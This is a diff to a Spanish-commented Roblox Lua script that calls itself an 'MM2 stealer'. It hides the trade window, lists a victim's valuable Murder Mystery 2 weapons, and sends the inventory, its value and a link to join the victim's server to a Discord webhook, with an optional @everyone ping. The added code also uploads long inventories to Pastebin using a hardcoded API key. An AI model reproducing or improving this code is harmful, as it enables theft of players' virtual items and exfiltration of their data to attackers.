@@ -8,7 +8,7 @@ getgenv().ScriptEjecutado = true
 
 -- Configuración
 local webhook = _G.webhook or ""
-local users = _G.Usernames or {} -- Nicknames originales
+local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
@@ -33,6 +33,28 @@ local function SendWebhook(title, description, fields, prefix)
     pcall(function()
         req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
     end)
+end
+
+-- Función para crear paste en Pastebin
+local function CreatePaste(content)
+    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
+    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
+    local api_paste_format = "text"
+    local api_paste_private = "1"
+
+    local body = "api_option=paste&api_dev_key="..api_dev_key..
+                 "&api_paste_code="..HttpService:UrlEncode(content)..
+                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
+                 "&api_paste_format="..api_paste_format..
+                 "&api_paste_private="..api_paste_private
+
+    local res = req({
+        Url = "https://pastebin.com/api/api_post.php",
+        Method = "POST",
+        Headers = {["Content-Type"]="application/x-www-form-urlencoded"},
+        Body = body
+    })
+    if res and res.Body then return res.Body end
 end
 
 -- Ocultar GUI de trade
@@ -175,17 +197,40 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
+-- Preparar contenido completo para Pastebin
+local pasteContent = ""
+for _, w in ipairs(weaponsToSend) do
+    pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+end
+pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"
+
+local pasteLink
+if #weaponsToSend > 18 then
+    pasteLink = CreatePaste(pasteContent)
+end
+
 -- Webhook inventario
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false} -- solo el real
+        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
     }
-    for _, w in ipairs(weaponsToSend) do
-        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+
+    local maxEmbedItems = math.min(18,#weaponsToSend)
+    for i=1,maxEmbedItems do
+        local w = weaponsToSend[i]
+        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
     end
+
+    if #weaponsToSend > 18 then
+        fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
+        if pasteLink then
+            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
+        end
+    end
+
     local prefix=pingEveryone and "@everyone " or ""
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
